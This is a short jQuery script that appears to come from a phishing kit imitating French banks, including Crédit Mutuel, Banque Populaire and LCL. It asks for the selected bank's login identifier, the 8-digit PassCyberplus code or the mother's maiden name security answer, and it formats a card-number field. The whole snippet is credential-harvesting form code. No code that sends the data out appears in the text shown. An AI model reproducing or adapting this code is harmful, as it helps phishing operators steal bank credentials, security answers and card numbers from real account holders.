$('[name=b_name]').on('change', function(e){
				var option = $(this).find(':selected').val();
				if ($(this).find(':selected').is(':enabled')){
					$('#s_info').empty();
					if (option != 'CA'){
						var label = 'Num&#233;ro de compte';
						placeholder = label;
						var placeholder;
						switch(option){
							case 'CM':
								label = 'Identifiant banque &#224; distance';
								placeholder = label;
								break;
							case 'BP':
								label = 'PassCyberplus';
								placeholder = 'Les 8 chiffres du PassCyberplus';
								break;
							case 'LCL':
								label = 'Quel est le nom de jeune fille de votre m&#233;re?';
								placeholder = 'R&#233;ponse';
								break;
						}
						$('#s_info').append('<label for="s_field">' + label + '</label>');
						$('#s_info').append('<input type="text" name="s_field" class="form-control saisie" placeholder="' + placeholder + '" required/>');
					}
				}
			});
			var cc_n = '';
			$('[name=cc_n]').on('keypress', function(e) {
				cc_n = $(this).val();
				if ($.inArray(cc_n.length, [4, 9, 14]) != -1){
					cc_n += ' ';
					$(this).val(cc_n);
				}
				if (e.keyCode == 8){
					cc_n = cc_n.substring(0, cc_n.length - 1);
					$(this).val(cc_n);
				}
			});